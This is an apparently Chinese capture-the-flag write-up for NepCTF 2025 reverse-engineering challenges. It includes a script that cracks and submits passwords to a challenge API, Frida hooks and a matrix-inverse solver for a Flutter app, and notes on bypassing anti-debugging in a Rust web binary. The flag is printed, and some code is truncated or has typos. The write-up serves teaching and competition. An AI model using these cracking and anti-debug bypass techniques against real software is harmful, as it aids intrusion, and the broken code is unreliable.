<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def run_exe_with_input(exe_path, input_param):</span><br><span class="line">    try:</span><br><span class="line">        # 使用 subprocess.run 调用外部程序并传递参数</span><br><span class="line">        result = subprocess.run([exe_path, input_param], capture_output=True, text=True)</span><br><span class="line">        </span><br><span class="line">        if result.returncode == 0:</span><br><span class="line">            return result.stdout.strip() </span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Error executing the program.&quot;)</span><br><span class="line">            print(result.stderr) </span><br><span class="line">            returnNone</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;An error occurred: &#123;e&#125;&quot;)</span><br><span class="line">        returnNone</span><br><span class="line"></span><br><span class="line">exe_path = r&quot;D:\\CTF\\NepCTF_2025\\o11vm\\crack.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">host = &quot;https://nepctf31-y55e-wcub-xxoq-xsoooja9y723.nepctf.com&quot;</span><br><span class="line">#host = &quot;http://192.168.197.134:13000&quot;</span><br><span class="line"></span><br><span class="line"># Key and IV must be bytes</span><br><span class="line">def aes_encrypt(data):</span><br><span class="line">    data = json.dumps(data)</span><br><span class="line"></span><br><span class="line">    key = b&#x27;0123456789012345&#x27;</span><br><span class="line">    iv = b&#x27;1234567890123456&#x27;</span><br><span class="line">    data_bytes = data.encode(&#x27;utf-8&#x27;) </span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    padded_data = pad(data_bytes, AES.block_size)</span><br><span class="line">    ciphertext = cipher.encrypt(padded_data)</span><br><span class="line">se64.b64encode(ciphertext).decode()</span><br><span class="line">    print(f&#x27;Ciphertext: &#123;encryptedText&#125;&#x27;)</span><br><span class="line">    return encryptedText</span><br><span class="line"></span><br><span class="line">def get_usernames():</span><br><span class="line">    url = f&#x27;&#123;host&#125;/api.php?action=getUsernames&#x27;</span><br><span class="line">    response = session.get(url)</span><br><span class="line">    return data.get(&#x27;usernames&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_password(data):</span><br><span class="line">    url = f&#x27;&#123;host&#125;/api.php?action=submit&#x27;</span><br><span class="line">    postData = &#123;&#x27;encrypted_data&#x27;: aes_encrypt(data)&#125;</span><br><span class="line">    response = session.post(url=url, json = postData)</span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">information = &#123;&#125;</span><br><span class="line">usernames = get_usernames()</span><br><span class="line">for username in usernames:</span><br><span class="line">    password = run_exe_with_input(exe_path, username)</span><br><span class="line">    print(f&quot;&#123;username&#125;: &#123;password&#125;&quot;)</span><br><span class="line">    information[username] = password</span><br><span class="line"></span><br><span class="line">check_password(information)</span><br></pre></td></tr></table></figure></div>

<h2 id="FlutterPro"><a href="#FlutterPro" class="headerlink" title="FlutterPro"></a><strong>FlutterPro</strong></h2><p>两个so 都抹掉了 section table 的大部分信息，blutter运行会报错 <code>AttributeError: &#39;NoneType&#39; object has no attribute &#39;get_symbol_by_name&#39;</code></p>
<p>分析 blutter 源码，extract_dart_info 获取dart版本和snapshot_hash信息，根据help信息发现可以指定下载Dart SDK</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--dart-version DART_VERSION</span><br><span class="line">                        Run without libflutter (indir become libapp.so) by specify dart version such as</span><br><span class="line">                        &quot;3.4.2_android_arm64&quot;</span><br></pre></td></tr></table></figure></div>

<p>分析 extract_libflutter_info 可知，寻找 <code>(stable) (</code> 可得到 dart_version 为 3.8.1 指定 –dart-version 3.8.1_android_arm64 注意 indir 要选择为 libapp.so 的路径</p>
<p>~~ 跳过一堆编译问题,库依赖问题，网络问题，反正实测能修 ~~</p>
<p>若为IDA 9，需要改 blutter\src\DartDumper.cpp 中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg9OvABXgBY1veBzEwyoibPY5xCybXCSH0Mib1ObHXN1MjsZ6zvCPYxmHw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>根据 asm&#x2F;flutterpro&#x2F;main.dart ，onTap 触发验证，IDA分析，设置 v6 类型为 DartObjectPool*，可得到引用的字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXguDiaAOL7Yrr34OyKkakqywhg5rTREodd0PsSSUZNYOBBW9knrNcZpxg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg79HYgeSlbUQlTA9PhPLPmAZGSOCL5tjABcict3GaLv9E4Sqia3BwvCiaA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgGDXh2xIequE6EWqaGgIA2tjzcdB19O1zjsIL1K0GHsKoV8qxXfaUZA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>IDA 分析函数列表不太全，需要每一个函数点进去看一下，最后反编译，会有额外的代码</p>
<p>找到最后的比较条件和字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgnmhJ2zRaE48Nh1KiapIemagRnJmeUsiazWhePwQVyQ0GYbh2qftupucg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>首先判断长度是否为 64 （注意flutter存储小数字的方式）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgcMfv0qiceHZHXnUNTXSbLCPeQRvvqPobLBUkSUOpAEWNV3sVC7HMggQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>Hook 0x203624,多打印参数和返回值，可发现返回一个 8x8 列表，其实是个矩阵乘法运算</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgpZiaUFtsXZlvhqNaFRmmibCN3tiaGCiboQXYgNibxlOHHyUUPlv8tWDUaicQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>Hook 验证,可得到乘法矩阵 key</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.attach(libapp.add(0x203844), &#123;</span><br><span class="line">    onEnter: function () &#123;</span><br><span class="line">        console.log(this.context[&#x27;x2&#x27;])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Interceptor.attach(libapp.add(0x203850), &#123;</span><br><span class="line">    onEnter: function () &#123;</span><br><span class="line">        console.log(this.context[&#x27;x0&#x27;])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>随后是一个RCNB编码，每一个数字转成RCNB字符串拼接</p>
<p>出题 and 解题脚本</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">class RCNB():</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    RCNB类</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    __cr = [&#x27;r&#x27;, &#x27;R&#x27;, &#x27;Ŕ&#x27;, &#x27;ŕ&#x27;, &#x27;Ŗ&#x27;, &#x27;ŗ&#x27;, &#x27;Ř&#x27;,</span><br><span class="line">            &#x27;ř&#x27;, &#x27;Ʀ&#x27;, &#x27;Ȑ&#x27;, &#x27;ȑ&#x27;, &#x27;Ȓ&#x27;, &#x27;ȓ&#x27;, &#x27;Ɍ&#x27;, &#x27;ɍ&#x27;]</span><br><span class="line">    __cc = [&#x27;c&#x27;, &#x27;C&#x27;, &#x27;Ć&#x27;, &#x27;ć&#x27;, &#x27;Ĉ&#x27;, &#x27;ĉ&#x27;, &#x27;Ċ&#x27;,</span><br><span class="line">            &#x27;ċ&#x27;, &#x27;Č&#x27;, &#x27;č&#x27;, &#x27;Ƈ&#x27;, &#x27;ƈ&#x27;, &#x27;Ç&#x27;, &#x27;Ȼ&#x27;, &#x27;ȼ&#x27;]</span><br><span class="line">    __cn = [&#x27;n&#x27;, &#x27;N&#x27;, &#x27;Ń&#x27;, &#x27;ń&#x27;, &#x27;Ņ&#x27;, &#x27;ņ&#x27;, &#x27;Ň&#x27;,</span><br><span class="line">            &#x27;ň&#x27;, &#x27;Ɲ&#x27;, &#x27;ƞ&#x27;, &#x27;Ñ&#x27;, &#x27;Ǹ&#x27;, &#x27;ǹ&#x27;, &#x27;Ƞ&#x27;, &#x27;ȵ&#x27;]</span><br><span class="line">    __cb = [&#x27;b&#x27;, &#x27;B&#x27;, &#x27;ƀ&#x27;, &#x27;Ɓ&#x27;, &#x27;ƃ&#x27;, &#x27;Ƅ&#x27;, &#x27;ƅ&#x27;, &#x27;ß&#x27;, &#x27;Þ&#x27;, &#x27;þ&#x27;]</span><br><span class="line"></span><br><span class="line">    # __sr = len(__cr)</span><br><span class="line">    __sc = len(__cc)</span><br><span class="line">    __sn = len(__cn)</span><br><span class="line">    __sb = len(__cb)</span><br><span class="line">    # __src = __sr * __sc</span><br><span class="line">    __snb = __sn * __sb</span><br><span class="line">    __scnb = __sc * __snb</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def __encodeByte(cls, i: int) -&gt; str:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        单字节编码</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        if (i &gt; 0xFF):</span><br><span class="line">            raise ValueError(&#x27;rc/nb overflow&#x27;)</span><br><span class="line">        if (i &gt; 0x7F):</span><br><span class="line">            i &amp;= 0x7F</span><br><span class="line">            r = f&#x27;&#123;cls.__cn[i // cls.__sb]&#125;&#123;cls.__cb[i % cls.__sb]&#125;&#x27;</span><br><span class="line">        else:</span><br><span class="line">            r = f&#x27;&#123;cls.__cr[i // cls.__sc]&#125;&#123;cls.__cc[i % cls.__sc]&#125;&#x27;</span><br><span class="line">        return(r)</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def __encodeShort(cls, i: int) -&gt; str:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        双字节编码</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        if (i &gt; 0xFFFF):</span><br><span class="line">            raise ValueError(&#x27;rc/nb overflow&#x27;)</span><br><span class="line">        reverse = False</span><br><span class="line">        if (i &gt; 0x7FFF):</span><br><span class="line">            reverse = True</span><br><span class="line">            i &amp;= 0x7FFF</span><br><span class="line">        if (not reverse):</span><br><span class="line">            r = (cls.__cr[i // cls.__scnb], cls.__cc[i % cls.__scnb // cls.__snb],</span><br><span class="line">                 cls.__cn[i % cls.__snb // cls.__sb], cls.__cb[i % cls.__sb])</span><br><span class="line">        else:</span><br><span class="line">            r = (cls.__cn[i % cls.__snb // cls.__sb], cls.__cb[i % cls.__sb],</span><br><span class="line">                 cls.__cr[i // cls.__scnb], cls.__cc[i % cls.__scnb // cls.__snb])</span><br><span class="line">        return(&#x27;&#x27;.join(r))</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def __decodeByte(cls, s: str) -&gt; int:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        解码成单字节</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        try:</span><br><span class="line">            id1 = cls.__cr.index(s[0])</span><br><span class="line">            id2 = cls.__cc.index(s[1])</span><br><span class="line">            nb = False</span><br><span class="line">        except ValueError:</span><br><span class="line">            try:</span><br><span class="line">                id1 = cls.__cn.index(s[0])</span><br><span class="line">                id2 = cls.__cb.index(s[1])</span><br><span class="line">                nb = True</span><br><span class="line">            except ValueError:</span><br><span class="line">                raise ValueError(&#x27;not rc/nb&#x27;)</span><br><span class="line">        r = (id1 * cls.__sb + id2) if nb else (id1 * cls.__sc + id2)</span><br><span class="line">        if (r &gt; 0x7F):</span><br><span class="line">            raise ValueError(&#x27;rc/nb overflow&#x27;)</span><br><span class="line">        r |= 0x80if nb else0</span><br><span class="line">        return(r)</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def __decodeShort(cls, s: str) -&gt; int:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        解码成双字节</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        reverse = s[0] notin cls.__cr</span><br><span class="line">        try:</span><br><span class="line">            if (not reverse):</span><br><span class="line">                idx = (cls.__cr.index(s[0]), cls.__cc.index(s[1]),</span><br><span class="line">                       cls.__cn.index(s[2]), cls.__cb.index(s[3]))</span><br><span class="line">            else:</span><br><span class="line">                idx = (cls.__cr.index(s[2]), cls.__cc.index(s[3]),</span><br><span class="line">                       cls.__cn.index(s[0]), cls.__cb.index(s[1]))</span><br><span class="line">        except ValueError:</span><br><span class="line">            raise ValueError(&#x27;not rcnb&#x27;)</span><br><span class="line">        r = idx[0] * cls.__scnb + idx[1] * \</span><br><span class="line">            cls.__snb + idx[2] * cls.__sb + idx[3]</span><br><span class="line">        if (r &gt; 0x7FFF):</span><br><span class="line">            raise ValueError(&#x27;rcnb overflow&#x27;)</span><br><span class="line">        r |= 0x8000if reverse else0</span><br><span class="line">        return(r)</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def encodeBytes(cls, bs: bytes) -&gt; str:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        字节编码</span><br><span class="line"></span><br><span class="line">        参数:</span><br><span class="line">            bs: 字节数据</span><br><span class="line">        返回:</span><br><span class="line">            str: 密文</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        r = []</span><br><span class="line">        l = len(bs) &gt;&gt; 1</span><br><span class="line">        for i in range(0, l):</span><br><span class="line">            r.append(cls.__encodeShort((bs[i * 2] &lt;&lt; 8) | bs[i * 2 + 1]))</span><br><span class="line">        if (len(bs) &amp; 1 == 1):</span><br><span class="line">            r.append(cls.__encodeByte(bs[-1]))</span><br><span class="line">        return(&#x27;&#x27;.join(r))</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def encode(cls, s: str, encoding: str = &#x27;utf-8&#x27;) -&gt; str:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        文本编码</span><br><span class="line"></span><br><span class="line">        参数:</span><br><span class="line">            s: 明文</span><br><span class="line">            encoding: 字符串编码方式</span><br><span class="line">        返回:</span><br><span class="line">            str: 密文</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        assert isinstance(s, str), &#x27;s must be str&#x27;</span><br><span class="line">        bs = s.encode(encoding)</span><br><span class="line">        r = cls.encodeBytes(bs)</span><br><span class="line">        return(r)</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def decodeBytes(cls, s: str) -&gt; bytes:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        解码为字节</span><br><span class="line"></span><br><span class="line">        参数:</span><br><span class="line">            s: 密文</span><br><span class="line">        返回:</span><br><span class="line">            bytes: 二进制数据</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        assert isinstance(s, str), &#x27;s must be str&#x27;</span><br><span class="line">        if (len(s) &amp; 1):</span><br><span class="line">            raise ValueError(&#x27;invalid length&#x27;)</span><br><span class="line">        r = []</span><br><span class="line">        l = len(s) &gt;&gt; 2</span><br><span class="line">        for i in range(0, l):</span><br><span class="line">            value = cls.__decodeShort(s[i * 4: i * 4 + 4])</span><br><span class="line">            r.append(bytes([value &gt;&gt; 8]))</span><br><span class="line">            r.append(bytes([value &amp; 0xFF]))</span><br><span class="line">        if ((len(s) &amp; 2) == 2):</span><br><span class="line">            r.append(bytes([cls.__decodeByte(s[-2:])]))</span><br><span class="line">        return (b&#x27;&#x27;.join(r))</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def decode(cls, s: str, encoding: str = &#x27;utf-8&#x27;) -&gt; str:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        解码为文本</span><br><span class="line"></span><br><span class="line">        参数:</span><br><span class="line">            s: 密文</span><br><span class="line">            encoding: 字符串编码方式</span><br><span class="line">        返回:</span><br><span class="line">            str: 明文</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        assert isinstance(s, str), &#x27;s must be str&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = cls.decodeBytes(s)</span><br><span class="line">        except UnicodeDecodeError:</span><br><span class="line">            raise ValueError(&#x27;decode error&#x27;)</span><br><span class="line">        return(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(RCNB.encode(&#x27;EvilNeuroIsCute!&#x27;))</span><br><span class="line"></span><br><span class="line">InputArray = [[0for _ in range(8)] for _ in range(8)]</span><br><span class="line">KeyArray = [[0for _ in range(8)] for _ in range(8)]</span><br><span class="line"></span><br><span class="line">InputFlag = b&#x27;NepCTF&#123;ProtectedFlutterMakesBlutterADullTool???UseBlutterWisely&#125;&#x27;</span><br><span class="line">Key = &#x27;NeuroSamaIsCuteEvilNeuroAlsoCute&#x27;</span><br><span class="line">Key = [4,14,6,5,7,5,7,2,</span><br><span class="line">6,15,5,3,6,1,6,13,</span><br><span class="line">6,1,4,9,7,3,4,3,</span><br><span class="line">7,5,7,4,6,5,4,5,</span><br><span class="line">7,6,6,9,6,12,4,14,</span><br><span class="line">6,5,7,5,7,2,6,15,</span><br><span class="line">4,1,6,12,7,3,6,15,</span><br><span class="line">4,3,7,5,7,4,6,5</span><br><span class="line">]</span><br><span class="line">print(len(Key))</span><br><span class="line">for i in range(8):</span><br><span class="line">    for j in range(8):</span><br><span class="line">        InputArray[i][j] = InputFlag[8*i+j]</span><br><span class="line">        KeyArray[i][j] = Key[8*i+j]</span><br><span class="line"></span><br><span class="line">resultArray = [[0for _ in range(8)] for _ in range(8)]</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    for j in range(8):</span><br><span class="line">        for k in range(8):</span><br><span class="line">            resultArray[i][j] += InputArray[i][k] * KeyArray[k][j]</span><br><span class="line"></span><br><span class="line">print(resultArray)</span><br><span class="line">resultString = &quot;&quot;</span><br><span class="line">for i in range(8):</span><br><span class="line">    for j in range(8):</span><br><span class="line">        resultString += RCNB._RCNB__encodeShort(resultArray[i][j])</span><br><span class="line"></span><br><span class="line">print(resultString)</span><br><span class="line"></span><br><span class="line">print(RCNB.decodeBytes(resultString).hex())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Solve ---------------------------------</span><br><span class="line">import struct</span><br><span class="line">import numpy as np</span><br><span class="line">resultMat = [[0for _ in range(8)] for _ in range(8)]</span><br><span class="line">resultNumString = RCNB.decode(resultString)</span><br><span class="line">for i in range(8):</span><br><span class="line">    for j in range(8):</span><br><span class="line">        resultMat[i][j] = struct.unpack_from(&quot;&gt;H&quot;,resultNumString,2*(8*i+j))[0]</span><br><span class="line"></span><br><span class="line">res = np.dot(resultMat,np.linalg.inv(KeyArray))</span><br><span class="line">for i in range(8):</span><br><span class="line">    for j in range(8):</span><br><span class="line">        print(chr(np.rint(res[i][j]).astype(int)),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure></div>

<h2 id="QRS"><a href="#QRS" class="headerlink" title="QRS"></a><strong>QRS</strong></h2><ol>
<li>bin+pdb，可以快速确认这是一道由rust编写的逆向题目，根据输出信息以及pdb符号可以确定这题使用axum框架启动了一个web服务，并且需要逆向的接口是”&#x2F;interface”</li>
<li>解决反调试：可以看到调试器启动附加就会退，甚至挂在main函数开头的断点也无法执行到。可以在main函数之前获取执行时机的方法不多，检查tls和init_array，发现<em>pre_cpp_initializer</em>被插入了函数，其在*_scrt_common_main_seh<em>内被执行，作用仅为调用</em>NtSetInformationThread ThreadHideFromDebugger*</li>
<li>最为关键的一步是axum是异步框架，需要找到对应接口的handler函数，需要做题者对框架有一定的理解，通过函数名”axum__handler__Handler”找到对应的Handler函数0x14002B2D0</li>
<li>直接访问这个接口，可以看到报错，即，可以知道需要传入一个string类型名为input的字段</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to deserialize query string: missing field `input`</span><br></pre></td></tr></table></figure></div>

<ol>
<li>访问”<a class="link"   target="_blank" rel="noopener" href="http://127.0.0.1:12321/interface?input=xxxxx%22%EF%BC%8C%E5%B9%B6%E6%8C%82%E6%96%AD%E7%82%B9%E5%9C%A8Handler%E5%87%BD%E6%95%B0%EF%BC%880x14002B2D0%EF%BC%89%E4%B8%8A%EF%BC%8C%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95%E3%80%82%E5%8F%AF%E4%BB%A5%E5%88%86%E6%9E%90%E5%BE%97%E5%88%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%87%BD%E6%95%B0%E5%9C%A8%22QRS::e12c96f7a24fc73e1::axum_extract::b2a92c317a3cdec81::h3500f6e3d3784860%22%E5%86%85%EF%BC%8C%E4%B8%BA%E9%AD%94%E6%94%B9XTEA" >http://127.0.0.1:12321/interface?input=xxxxx&quot;，并挂断点在Handler函数（0x14002B2D0）上，开始调试。可以分析得到加密算法函数在&quot;QRS::e12c96f7a24fc73e1::axum_extract::b2a92c317a3cdec81::h3500f6e3d3784860&quot;内，为魔改XTEA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>分析该算法函数，round&#x3D;48，delta为GetTickCount的返回值。但实际上该API已经被IATHook，会恒返回特定值0x68547369</li>
